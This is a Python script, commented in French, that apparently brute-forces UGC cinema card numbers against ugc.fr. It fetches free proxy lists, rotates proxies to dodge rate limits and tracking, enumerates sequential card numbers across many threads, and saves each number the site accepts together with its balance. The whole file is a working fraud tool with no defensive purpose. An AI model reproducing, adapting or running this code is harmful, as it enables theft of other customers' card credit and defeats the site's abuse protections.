#!/usr/bin/env python3
"""
UGC card checker via proxy rotation
Sources: proxyscrape.com (gratuit, pas de compte)
Fallback: undetected-chromedriver si proxies tous morts

pip install requests[socks] beautifulsoup4 cloudscraper
pip install undetected-chromedriver selenium  (optionnel, pour fallback)

Usage:
  python ugc_proxy.py --check 12345678901
  python ugc_proxy.py --brute --prefix 1 --len 11 --count 500
  python ugc_proxy.py --fetch-proxies   # juste récupérer + tester les proxies
"""

import re, time, random, argparse, threading, queue, json
from pathlib import Path
from datetime import datetime

import requests, urllib3
urllib3.disable_warnings()
from bs4 import BeautifulSoup

# ─── SOURCES PROXIES GRATUITS (open source / public) ──────────────────────────
PROXY_SOURCES = [
    # proxyscrape — HTTPS + SOCKS5, gratuit sans compte
    "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=http&country=all&ssl=all&anonymity=elite&limit=200",
    "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=socks5&country=all&ssl=all&anonymity=all&limit=200",
    # github raw lists (mis à jour régulièrement par la communauté)
    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
]

PROXY_CACHE = Path("proxies_cache.json")
PAGE_URL    = "https://www.ugc.fr/les-offres-ugc.html"
ACTION_URL  = "https://www.ugc.fr/offresCartesAction/valider.action"
ACTION_ALT  = "https://www.ugc.fr/offresCartesAction!valider.action"
HIDDEN_BASE = {"page": "30013", "type": "ugc"}
CARD_FIELD  = "cardNumber"

ERROR_KW        = ["le type de carte est inconnu","type de carte est inconnu",
                   "introuvable","invalide","incorrect","carte inconnue"]
SESSION_LIMIT   = ["une demande a déjà été envoyée","momentanément indisponible"]
SUCCESS_KW      = ["votre solde","solde :","places restantes","carte est valide",
                   "crédit disponible","valable jusqu"]

# ─── FETCH PROXIES ─────────────────────────────────────────────────────────────
def fetch_proxy_list(verbose=True) -> list:
    """Récupère les proxies depuis plusieurs sources publiques."""
    proxies = set()
    s = requests.Session()
    s.headers["User-Agent"] = "Mozilla/5.0"

    for url in PROXY_SOURCES:
        try:
            r = s.get(url, timeout=10)
            if r.status_code == 200:
                # format: ip:port une par ligne
                found = re.findall(r'\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{2,5})\b', r.text)
                proxies.update(found)
                if verbose:
                    print(f"  [+] {url.split('/')[2]} → {len(found)} proxies")
        except Exception as e:
            if verbose:
                print(f"  [!] {url.split('/')[2]} → {e}")

    result = list(proxies)
    random.shuffle(result)
    if verbose:
        print(f"\n[*] Total brut: {len(result)} proxies")
    return result

def test_proxy(proxy_str: str, timeout=6) -> str | None:
    """Teste un proxy contre ugc.fr. Retourne 'http://ip:port' ou None."""
    for scheme in ("http", "socks5"):
        url = f"{scheme}://{proxy_str}"
        try:
            r = requests.get(
                "https://www.ugc.fr/les-offres-ugc.html",
                proxies={"http": url, "https": url},
                timeout=timeout, verify=False,
                headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124"}
            )
            if r.status_code in (200, 302, 403):
                return url
        except Exception:
            pass
    return None

def load_or_fetch_proxies(force_refresh=False, min_working=10) -> list:
    """Charge depuis le cache ou re-fetch + teste si trop vieux / insuffisant."""
    working = []

    if not force_refresh and PROXY_CACHE.exists():
        data = json.loads(PROXY_CACHE.read_text())
        age  = time.time() - data.get("ts", 0)
        working = data.get("proxies", [])
        if age < 3600 and len(working) >= min_working:
            print(f"[*] Cache: {len(working)} proxies ({int(age/60)}min)")
            return working
        print(f"[*] Cache expiré ou insuffisant ({len(working)} proxies, {int(age/60)}min) — refresh")

    raw = fetch_proxy_list()
    print(f"\n[*] Test des proxies (timeout=6s)...")

    q = queue.Queue()
    for p in raw[:300]:
        q.put(p)

    lock = threading.Lock()

    def tester():
        while True:
            try:
                p = q.get_nowait()
            except queue.Empty:
                break
            result = test_proxy(p)
            if result:
                with lock:
                    working.append(result)
                    print(f"  [✓] {result}")
            q.task_done()

    threads = [threading.Thread(target=tester, daemon=True) for _ in range(40)]
    for t in threads: t.start()
    q.join()

    random.shuffle(working)
    PROXY_CACHE.write_text(json.dumps({"ts": time.time(), "proxies": working}))
    print(f"\n[*] Proxies valides: {len(working)}")
    return working

# ─── SESSION AVEC PROXY ────────────────────────────────────────────────────────
def make_proxy_sess(proxy_url: str):
    try:
        import cloudscraper
        s = cloudscraper.create_scraper(browser={"browser":"chrome","platform":"windows"})
    except ImportError:
        s = requests.Session()
        s.verify = False
    s.proxies = {"http": proxy_url, "https": proxy_url}
    s.headers.update({
        "Accept-Language": "fr-FR,fr;q=0.9",
        "Referer": "https://www.ugc.fr/",
        "Origin":  "https://www.ugc.fr",
    })
    return s

# ─── CHECK CARTE ───────────────────────────────────────────────────────────────
def check_card(num: str, proxy_url: str) -> dict:
    """Vérifie une carte via le proxy donné. Retourne dict avec valid/balance."""
    num = str(num).strip()
    sess = make_proxy_sess(proxy_url)
    try:
        # GET page pour cookies + parse form
        r0 = sess.get(PAGE_URL, timeout=15, allow_redirects=True)
        if r0.status_code == 429:
            return {"num": num, "status": "RATE_LIMITED"}

        # parse form réel
        soup0  = BeautifulSoup(r0.text, "html.parser")
        action = ACTION_URL
        payload = dict(HIDDEN_BASE)
        field   = CARD_FIELD

        for form in soup0.find_all("form"):
            inp_names = [i.get("name","").lower() for i in form.find_all("input")]
            if any("card" in n or "carte" in n or "numero" in n for n in inp_names):
                fa = form.get("action","").strip()
                if fa:
                    action = ("https://www.ugc.fr" + fa) if not fa.startswith("http") else fa
                payload = {}
                for inp in form.find_all("input"):
                    t  = inp.get("type","").lower()
                    nm = inp.get("name","")
                    if not nm: continue
                    if t == "hidden":
                        payload[nm] = inp.get("value","")
                    nm_low = nm.lower()
                    if t not in ("hidden","submit","button") and (
                        "card" in nm_low or "carte" in nm_low or
                        "numero" in nm_low or "number" in nm_low
                    ):
                        field = nm
                break

        payload[field] = num
        post_h = {"Referer": PAGE_URL, "Content-Type": "application/x-www-form-urlencoded"}

        # essaie les deux variantes
        for url in (action, ACTION_ALT):
            try:
                r = sess.post(url, data=payload, timeout=15,
                              allow_redirects=True, headers=post_h)
                if r.status_code != 404:
                    break
            except Exception:
                continue
        else:
            return {"num": num, "status": "ERR_404"}

        if r.status_code == 429:
            return {"num": num, "status": "RATE_LIMITED"}

        low = r.text.lower()

        if any(k in low for k in SESSION_LIMIT):
            return {"num": num, "status": "SESSION_LIMIT"}

        if any(k in low for k in ERROR_KW):
            return {"num": num, "status": "INVALID", "balance": None}

        if any(k in low for k in SUCCESS_KW):
            balance = None
            for pat in [r"\d+[.,]\d+\s*€", r"€\s*\d+[.,]\d+", r"\d+\s*places?"]:
                m = re.search(pat, r.text, re.I)
                if m:
                    balance = m.group(0).strip()
                    break
            return {"num": num, "status": "VALID", "balance": balance}

        return {"num": num, "status": f"AMBIG_{r.status_code}"}

    except Exception as e:
        return {"num": num, "status": f"ERR_{str(e)[:50]}"}

# ─── BRUTE FORCE ───────────────────────────────────────────────────────────────
LOCK   = threading.Lock()
FOUND  = []
STATS  = {"checked": 0, "valid": 0, "rate": 0, "err": 0}
STOP   = threading.Event()

def worker(work_q: queue.Queue, proxy_pool: list, out_file: str, delay: float):
    proxy_idx = random.randint(0, max(0, len(proxy_pool)-1))

    while not STOP.is_set():
        try:
            num = work_q.get(timeout=2)
        except queue.Empty:
            break

        proxy = proxy_pool[proxy_idx % len(proxy_pool)]
        res = check_card(num, proxy)

        if res["status"] in ("RATE_LIMITED", "SESSION_LIMIT", "ERR_404"):
            # rotate proxy
            proxy_idx = (proxy_idx + 1) % len(proxy_pool)
            work_q.put(num)
            with LOCK: STATS["rate"] += 1
            time.sleep(1)
            work_q.task_done()
            continue

        if res["status"].startswith("ERR_"):
            proxy_idx = (proxy_idx + 1) % len(proxy_pool)
            work_q.put(num)
            with LOCK: STATS["err"] += 1
            work_q.task_done()
            continue

        with LOCK:
            STATS["checked"] += 1
            c     = STATS["checked"]
            total = c + work_q.qsize()
            pct   = (c / max(total,1)) * 100

            if res["status"] == "VALID":
                STATS["valid"] += 1
                FOUND.append(res)
                line = f"💳 VALID: {res['num']} | solde: {res.get('balance')}"
                print(f"\n  ✅ {line}")
                with open(out_file, "a", encoding="utf-8") as f:
                    f.write(f"{datetime.now().isoformat()} | {line}\n")

            print(f"  [{c:>6}/{total}] {pct:5.1f}%  valid={STATS['valid']}  "
                  f"429={STATS['rate']}  err={STATS['err']}  "
                  f"proxy={proxy.split('//')[1][:20]}  last={num}", end="\r", flush=True)

        time.sleep(delay + random.uniform(0, delay*0.3))
        # rotate proxy toutes les 5 cartes pour éviter le tracking
        if STATS["checked"] % 5 == 0:
            proxy_idx = (proxy_idx + 1) % len(proxy_pool)
        work_q.task_done()

def run_brute(nums, threads, delay, out_file, proxies):
    random.shuffle(nums)
    q = queue.Queue()
    for n in nums: q.put(str(n))

    print(f"[*] {len(nums)} cartes | {threads} threads | {len(proxies)} proxies | delay={delay}s")
    print(f"[*] Output: {out_file}")
    print("─"*70)

    ts = [threading.Thread(target=worker,
          args=(q, proxies, out_file, delay), daemon=True)
          for _ in range(threads)]
    for t in ts: t.start()
    try: q.join()
    except KeyboardInterrupt:
        print("\n[!] Interrupted"); STOP.set()
    for t in ts: t.join(timeout=3)

    print(f"\n\n{'═'*70}")
    print(f"  Checked : {STATS['checked']}")
    print(f"  Valid   : {STATS['valid']}")
    if FOUND:
        print(f"\n  💳 CARTES VALIDES:")
        for r in FOUND:
            print(f"     {r['num']} — solde: {r.get('balance')}")
    print('═'*70)

# ─── MAIN ──────────────────────────────────────────────────────────────────────
def main():
    p = argparse.ArgumentParser(description="UGC card checker via proxy rotation")
    p.add_argument("--check",          help="Vérifie une carte")
    p.add_argument("--brute",          action="store_true")
    p.add_argument("--fetch-proxies",  action="store_true", dest="fetch")
    p.add_argument("--refresh",        action="store_true", help="Force refresh proxy cache")
    p.add_argument("--prefix",         default="1")
    p.add_argument("--len",            type=int, default=11)
    p.add_argument("--count",          type=int, default=1000)
    p.add_argument("--start",          type=int)
    p.add_argument("--end",            type=int)
    p.add_argument("--threads",        type=int, default=8)
    p.add_argument("--delay",          type=float, default=0.5)
    p.add_argument("--output",         default="ugc_valid_cards.txt")
    args = p.parse_args()

    if args.fetch:
        proxies = load_or_fetch_proxies(force_refresh=True)
        print(f"\nSauvegardé: {len(proxies)} proxies → {PROXY_CACHE}")
        return

    proxies = load_or_fetch_proxies(force_refresh=args.refresh)
    if not proxies:
        print("[!] Aucun proxy disponible — relance avec --refresh")
        return

    if args.check:
        print(f"[*] Check {args.check} via {proxies[0]}")
        res = check_card(args.check, proxies[0])
        if res["status"] == "VALID":
            print(f"\n✅ VALID — solde: {res.get('balance')}")
        elif res["status"] == "INVALID":
            print(f"\n❌ INVALID — carte inconnue")
        else:
            # essaie plusieurs proxies
            for proxy in proxies[1:5]:
                print(f"  [retry] {proxy}")
                res = check_card(args.check, proxy)
                if res["status"] in ("VALID","INVALID"):
                    break
            if res["status"] == "VALID":
                print(f"\n✅ VALID — solde: {res.get('balance')}")
            elif res["status"] == "INVALID":
                print(f"\n❌ INVALID — carte inconnue")
            else:
                print(f"\n❓ {res['status']}")
        return

    if args.brute:
        if args.start and args.end:
            nums = list(range(args.start, args.end+1))
        else:
            pad   = args.len - len(args.prefix)
            start = int(args.prefix) * (10**pad)
            nums  = [start + i for i in range(args.count)]
        run_brute(nums, args.threads, args.delay, args.output, proxies)
    else:
        p.print_help()

if __name__ == "__main__":
    main()
